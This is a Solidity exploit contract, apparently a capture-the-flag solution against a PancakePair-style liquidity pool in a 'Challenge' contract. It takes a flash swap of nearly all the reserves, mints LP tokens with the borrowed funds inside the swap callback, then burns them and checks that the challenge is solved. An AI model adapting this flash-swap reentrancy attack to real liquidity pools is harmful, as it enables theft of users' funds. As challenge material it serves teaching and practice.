// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Exploitor {
    Challenge public challenge;
    ERC20 public token0;
    ERC20 public token1;
    PancakePair public pair;

    constructor(Challenge _challenge) {
        challenge = _challenge;
        token0 = challenge.token0();
        token1 = challenge.token1();
        pair = challenge.pair();
    }

    function exploit() public payable {
        challenge.faucet();
        pair.swap(99e18 - 1e10, 99e18 - 1e10, address(this), "123");
        pair.transfer(address(pair), pair.balanceOf(address(this)));
        pair.burn(address(0xf2331a2d));
        assert(challenge.isSolved());
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        token0.transfer(address(pair), 1e18);
        token1.transfer(address(pair), 1e18);
        pair.mint(address(this));
        token0.transfer(address(pair), 99e18 - 1e10);
        token1.transfer(address(pair), 99e18 - 1e10);
    }
}
